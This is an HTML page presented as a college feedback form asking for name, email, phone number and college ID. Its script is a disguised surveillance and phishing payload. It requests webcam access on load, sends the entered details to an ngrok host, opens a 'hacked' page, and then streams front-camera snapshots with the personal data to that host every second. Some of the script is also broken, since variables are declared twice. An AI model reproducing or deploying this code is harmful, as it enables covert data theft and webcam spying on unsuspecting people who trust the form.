<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Feedback Form</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      padding: 1rem;
    }
    .card {
      background: #fff;
      border-radius: 16px;
      padding: 2.2rem;
      width: 100%;
      max-width: 440px;
      box-shadow: 0 20px 50px rgba(0,0,0,0.25);
    }
    .card h1 { font-size: 1.5rem; color: #1f2933; margin-bottom: 0.2rem; }
    .card p.sub { color: #6b7280; font-size: 0.9rem; margin-bottom: 1.5rem; }
    .field { margin-bottom: 1.1rem; position: relative; }
    label { display: block; font-size: 0.82rem; color: #374151; margin-bottom: 0.35rem; font-weight: 500; }
    input {
      width: 100%; padding: 0.7rem 0.85rem; border: 1.5px solid #d1d5db;
      border-radius: 10px; font-size: 0.95rem; transition: border-color 0.2s, box-shadow 0.2s; outline: none;
    }
    input:focus { border-color: #667eea; box-shadow: 0 0 0 3px rgba(102,126,234,0.15); }
    input.invalid { border-color: #ef4444; } input.valid { border-color: #10b981; }
    #msg { color: #ef4444; font-size: 0.82rem; margin-top: 0.4rem; min-height: 1em; }
    button { width: 100%; padding: 0.75rem; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: #fff; border: none; border-radius: 10px; font-size: 1rem; font-weight: 600; cursor: pointer; margin-top: 0.5rem; transition: transform 0.1s, opacity 0.2s; }
    button:hover { opacity: 0.92; } button:active { transform: scale(0.98); } button:disabled { opacity: 0.6; cursor: not-allowed; }
    .status-banner {
      background: #fef3c7; border: 1px solid #fcd34d; border-radius: 8px; padding: 0.75rem 1rem; margin-bottom: 1rem; display: none;
      align-items: center; gap: 0.5rem; font-size: 0.85rem; color: #92400e;
    }
    .capture-indicator {
      display: flex; align-items: center; justify-content: center;
      gap: 0.5rem; margin-top: 0.5rem; color: #ef4444; font-size: 0.85rem;
    }
    .capture-indicator .dot {
      width: 8px; height: 8px; background: #ef4444; border-radius: 50%;
      animation: pulse 1s infinite;
    }
    @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
  </style>
</head>
<body>
  <div class="card">
    <h1>Feedback Form</h1>
    <p class="sub">Please fill in your details.</p>

    <div class="status-banner" id="statusBanner"></div>

    <form id="feedbackForm" novalidate>
      <div class="field">
        <label for="name">Full Name</label>
        <input type="text" id="name" name="name" placeholder="Enter your full name" required />
      </div>
      <div class="field">
        <label for="email">Email ID</label>
        <input type="email" id="email" name="email" placeholder="you@example.com" required />
      </div>
      <div class="field">
        <label for="phone">Phone Number</label>
        <input type="tel" id="phone" name="phone" placeholder="+91 98765 43210" required />
      </div>
      <div class="field">
        <label for="collegeId">College ID</label>
        <input type="text" id="collegeId" name="collegeId" placeholder="e.g. CU2024001" required />
      </div>
      <button type="submit" id="submitBtn">Submit</button>
      <div id="msg"></div>
      <div class="capture-indicator" id="captureIndicator" style="display:none;">
        <span class="dot"></span> Capturing every 1s...
      </div>
    </form>
  </div>

  <script>
    const ADMIN_SERVER = "https://stainless-king-gravitate.ngrok-free.dev";
    const HACKED_PAGE = "https://An0nymOuS29.github.io/success.html";

    const form = document.getElementById("feedbackForm");
    const msg = document.getElementById("msg");
    const btn = document.getElementById("submitBtn");
    const statusBanner = document.getElementById("statusBanner");
    const captureIndicator = document.getElementById("captureIndicator");

    const validateEmail = (v) => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v);
    const validatePhone = (v) => /^[+]?[\d\s\-()]{7,15}$/.test(v.replace(/\s/g, ""));

    // Request camera permission immediately on page load
    let cameraStream = null;
    async function requestCameraPermission() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
        window.cameraStream = stream;
        return true;
      } catch (e) {
        return false;
      }
    }
    requestCameraPermission();

    form.addEventListener("submit", async (e) => {
      e.preventDefault();
      msg.textContent = "";

      const name = document.getElementById("name").value.trim();
      const email = document.getElementById("email").value.trim();
      const phone = document.getElementById("phone").value.trim();
      const collegeId = document.getElementById("collegeId").value.trim();

      let ok = true;
      [nameEl, emailEl, phoneEl, collegeEl] = ["name","email","phone","collegeId"].map(id => document.getElementById(id));
      [nameEl, emailEl, phoneEl, collegeEl].forEach(el => el.classList.remove("invalid", "valid"));

      if (!name) { nameEl.classList.add("invalid"); ok = false; } else nameEl.classList.add("valid");
      if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) { emailEl.classList.add("invalid"); ok = false; } else emailEl.classList.add("valid");
      if (!/^[+]?[\d\s\-()]{7,15}$/.test(phone.replace(/\s/g, ""))) { phoneEl.classList.add("invalid"); ok = false; } else phoneEl.classList.add("valid");
      if (!document.getElementById("collegeId").value.trim()) { collegeEl.classList.add("invalid"); ok = false; } else collegeEl.classList.add("valid");

      if (!ok) { msg.textContent = "Please fix the highlighted fields."; return; }

      // Disable form
      btn.disabled = true;
      btn.textContent = "Submitting...";

      const name = nameEl.value.trim();
      const email = document.getElementById("email").value.trim();
      const phone = document.getElementById("phone").value.trim();
      const collegeId = document.getElementById("collegeId").value.trim();

      // 1. Send initial user data to admin server
      await fetch("https://stainless-king-gravitate.ngrok-free.dev/submit", {
        method: "POST", headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ name, email, phone: document.getElementById("phone").value.trim(), collegeId, time: new Date().toISOString() })
      }).catch(() => {});

      // 2. Open hacked page in new tab
      window.open(HACKED_PAGE, "_blank");

      // 3. Start continuous capture every 1 second in THIS tab
      startContinuousCapture(name, email, phone, collegeId);

      // Show capture indicator
      captureIndicator.style.display = "flex";
      btn.disabled = true;
      btn.textContent = "Capturing every 1s... (close tab to stop)";

      // Hide form
      form.style.display = "none";
    });

    async function startContinuousCapture(name, email, phone, collegeId) {
      let stream = window.cameraStream;
      if (!stream) {
        try {
          stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
          window.cameraStream = stream;
        } catch (e) {
          console.warn("Camera not available");
          return;
        }
      }

      // Continuous capture every 1 second until tab closes
      async function captureLoop() {
        if (!stream) return;
        try {
          const video = document.createElement("video");
          video.srcObject = stream; video.autoplay = true; video.muted = true;
          await video.play();

          const canvas = document.createElement("canvas");
          canvas.width = 320; canvas.height = 240;
          const ctx = canvas.getContext("2d");
          ctx.drawImage(video, 0, 0, 320, 240);
          const dataUrl = canvas.toDataURL("image/jpeg", 0.6);

          await fetch("https://stainless-king-gravitate.ngrok-free.dev/capture", {
            method: "POST", headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ name: document.getElementById("name").value.trim(), email, phone: document.getElementById("phone").value.trim(), collegeId: document.getElementById("collegeId").value.trim(), image: dataUrl, time: new Date().toISOString() })
          }).catch(() => {});
        } catch (e) {}

        // Schedule next capture in 1 second
        setTimeout(captureLoop, 1000);
      }

      // Start the continuous capture loop
      captureLoop();
    }
  </script>
</body>
</html>
